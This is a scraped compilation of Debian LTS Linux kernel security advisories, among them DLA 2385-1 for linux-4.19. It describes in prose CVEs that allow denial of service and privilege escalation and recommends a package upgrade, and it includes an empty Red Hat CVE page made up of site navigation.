    use this to cause a denial of service (crash or memory corruption)
    or possibly for remote code execution with kernel privilege.

CVE-2020-25211

    A flaw was discovered in netfilter subsystem.  A local attacker
    able to inject conntrack Netlink configuration can cause a denial
    of service.

CVE-2020-25212

    A bug was discovered in the NFSv4 client implementation that could
    lead to a heap buffer overflow.  A malicious NFS server could use
    this to cause a denial of service (crash or memory corruption) or
    possibly to execute arbitrary code on the client.

CVE-2020-25284

    It was discovered that the Rados block device (rbd) driver allowed
    tasks running as uid 0 to add and remove rbd devices, even if they
    dropped capabilities.  On a system with the rbd driver loaded,
    this might allow privilege escalation from a container with a task
    running as root.

CVE-2020-25285

    A race condition was discovered in the hugetlb filesystem's sysctl
    handlers, that could lead to stack corruption.  A local user
    permitted to write to hugepages sysctls could use this to cause a
    denial of service (crash or memory corruption) or possibly for
    privilege escalation.  By default only the root user can do this.

CVE-2020-25641

    The syzbot tool found a bug in the block layer that could lead to
    an infinite loop.  A local user with access to a raw block device
    could use this to cause a denial of service (unbounded CPU use and
    possible system hang).

CVE-2020-25643

    ChenNan Of Chaitin Security Research Lab discovered a flaw in the
    hdlc_ppp module.  Improper input validation in the ppp_cp_parse_cr()
    function may lead to memory corruption and information disclosure.

CVE-2020-26088

    It was discovered that the NFC (Near Field Communication) socket
    implementation allowed any user to create raw sockets.  On a
    system with an NFC interface, this allowed local users to evade
    local network security policy.

For Debian 9 stretch, these problems have been fixed in version
4.9.240-1.  This update additionally includes many more bug fixes from
stable updates 4.9.229-4.9.240 inclusive.

We recommend that you upgrade your linux packages.

For the detailed security status of linux please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/linux>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

--
Ben Hutchings - Debian developer, member of kernel, installer and LTS teams

```

**Attachment:
[signature.asc](pgpzZtanbotWc.pgp)**

*Description:* This is a digitally signed message part

---



=== Content from access.redhat.com_f9eb047c_20250119_134733.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [FranÃ§ais](https://access.redhat.com/changeLanguage?language=fr)
* [í•œêµ­ì–´](https://access.redhat.com/changeLanguage?language=ko)
* [æ—¥æœ¬èªž](https://access.redhat.com/changeLanguage?language=ja)
* [ä¸­æ–‡ (ä¸­å›½)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 Â© 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from lists.debian.org_f5f153e6_20250119_120355.html ===


---

[[Date Prev](msg00024.html)][[Date Next](msg00026.html)]
[[Thread Prev](msg00024.html)][[Thread Next](msg00026.html)]
[[Date Index](maillist.html#00025)]
[[Thread Index](threads.html#00025)]

# [SECURITY] [DLA 2385-1] linux-4.19 security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 2385-1] linux-4.19 security update
* *From*: Ben Hutchings <benh@debian.org>
* *Date*: Mon, 28 Sep 2020 14:31:21 +0100
* *Message-id*: <[[ðŸ”Ž]](/msgid-search/6f99bd88563454ebb036cf61de092fcd74c690f4.camel%40debian.org)Â [6f99bd88563454ebb036cf61de092fcd74c690f4.camel@debian.org](msg00025.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-------------------------------------------------------------------------
Debian LTS Advisory DLA-2385-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                        Ben Hutchings
September 28, 2020                            <https://wiki.debian.org/LTS>
-------------------------------------------------------------------------

Package        : linux-4.19
Version        : 4.19.146-1~deb9u1
CVE ID         : CVE-2019-3874 CVE-2019-19448 CVE-2019-19813 CVE-2019-19816
                 CVE-2020-10781 CVE-2020-12888 CVE-2020-14314 CVE-2020-14331
                 CVE-2020-14356 CVE-2020-14385 CVE-2020-14386 CVE-2020-14390
                 CVE-2020-16166 CVE-2020-25212 CVE-2020-25284 CVE-2020-25285
                 CVE-2020-25641 CVE-2020-26088
Debian Bug     : 966846 966917 968567

Several vulnerabilities have been discovered in the Linux kernel that
may lead to a privilege escalation, denial of service, or information
leak.

CVE-2019-3874

    Kernel buffers allocated by the SCTP network protocol were not
    limited by the memory cgroup controller.  A local user could
    potentially use this to evade container memory limits and to cause
    a denial of service (excessive memory use).

CVE-2019-19448, CVE-2019-19813, CVE-2019-19816

    "Team bobfuzzer" reported bugs in Btrfs that could lead to a
    use-after-free or heap buffer overflow, and could be triggered by
    crafted filesystem images.  A user permitted to mount and access
    arbitrary filesystems could use these to cause a denial of service
    (crash or memory corruption) or possibly for privilege escalation.

CVE-2020-10781

    Luca Bruno of Red Hat discovered that the zram control file
    /sys/class/zram-control/hot_add was readable by all users.  On a
    system with zram enabled, a local user could use this to cause a
    denial of service (memory exhaustion).

CVE-2020-12888

    It was discovered that the PCIe Virtual Function I/O (vfio-pci)
    driver allowed users to disable a device's memory space while it
    was still mapped into a process.  On some hardware platforms,
    local users or guest virtual machines permitted to access PCIe
    Virtual Functions could use this to cause a denial of service
    (hardware error and crash).

CVE-2020-14314

    A bug was discovered in the ext4 filesystem that could lead to an
    out-of-bound read.  A local user permitted to mount and access
    arbitrary filesystem images could use this to cause a denial of
    service (crash).

CVE-2020-14331

    A bug was discovered in the VGA console driver's soft-scrollback
    feature that could lead to a heap buffer overflow.  On a system
    with a custom kernel that has CONFIG_VGACON_SOFT_SCROLLBACK
    enabled, a local user with access to a console could use this to
    cause a denial of service (crash or memory corruption) or possibly
    for privilege escalation.

CVE-2020-14356

    A bug was discovered in the cgroup subsystem's handling of socket
    references to cgroups.  In some cgroup configurations, this could
    lead to a use-after-free.  A local user might be able to use this
    to cause a denial of service (crash or memory corruption) or
    possibly for privilege escalation.

CVE-2020-14385

    A bug was discovered in XFS, which could lead to an extended
    attribute (xattr) wrongly being detected as invalid.  A local user
    with access to an XFS filesystem could use this to cause a denial
    of service (filesystem shutdown).

CVE-2020-14386

    Or Cohen discovered a bug in the packet socket (AF_PACKET)
    implementation which could lead to a heap buffer overflow.  A
    local user with the CAP_NET_RAW capability (in any user namespace)
    could use this to cause a denial of service (crash or memory
    corruption) or possibly for privilege escalation.

CVE-2020-14390

    Minh Yuan discovered a bug in the framebuffer console driver's
    scrollback feature that could lead to a heap buffer overflow.  On
    a system using framebuffer consoles, a local user with access to a
    console could use this to cause a denial of service (crash or
    memory corruption) or possibly for privilege escalation.

    The scrollback feature has been disabled for now, as no other fix
    was available for this issue.

CVE-2020-16166

    Amit Klein reported that the random number generator used by the
    network stack might not be re-seeded for long periods of time,
    making e.g. client port number allocations more predictable.  This
    made it easier for remote attackers to carry out some network-
    based attacks such as DNS cache poisoning or device tracking.

CVE-2020-25212

    A bug was discovered in the NFSv4 client implementation that could
    lead to a heap buffer overflow.  A malicious NFS server could use
    this to cause a denial of service (crash or memory corruption) or
    possibly to execute arbitrary code on the client.

CVE-2020-25284

    It was discovered that the Rados block device (rbd) driver allowed
    tasks running as uid 0 to add and remove rbd devices, even if they
    dropped capabilities.  On a system with the rbd driver loaded,
    this might allow privilege escalation from a container with a task
    running as root.

CVE-2020-25285

    A race condition was discovered in the hugetlb filesystem's sysctl
    handlers, that could lead to stack corruption.  A local user
    permitted to write to hugepages sysctls could use this to cause a
    denial of service (crash or memory corruption) or possibly for
    privilege escalation.  By default only the root user can do this.

CVE-2020-25641

    The syzbot tool found a bug in the block layer that could lead to
    an infinite loop.  A local user with access to a raw block device
    could use this to cause a denial of service (unbounded CPU use and
    possible system hang).

CVE-2020-26088

    It was discovered that the NFC (Near Field Communication) socket
    implementation allowed any user to create raw sockets.  On a
    system with an NFC interface, this allowed local users to evade
    local network security policy.

For Debian 9 stretch, these problems have been fixed in version
4.19.146-1~deb9u1.  This update additionally fixes Debian bugs
#966846, #966917, and #968567; and includes many more bug fixes from
stable updates 4.19.133-4.19.146 inclusive.

We recommend that you upgrade your linux-4.19 packages.

For the detailed security status of linux-4.19 please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/linux-4.19>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

--
Ben Hutchings - Debian developer, member of kernel, installer and LTS teams

```

**Attachment:
[signature.asc](pgpdnYNua0O5H.pgp)**

*Description:* This is a digitally signed message part

---


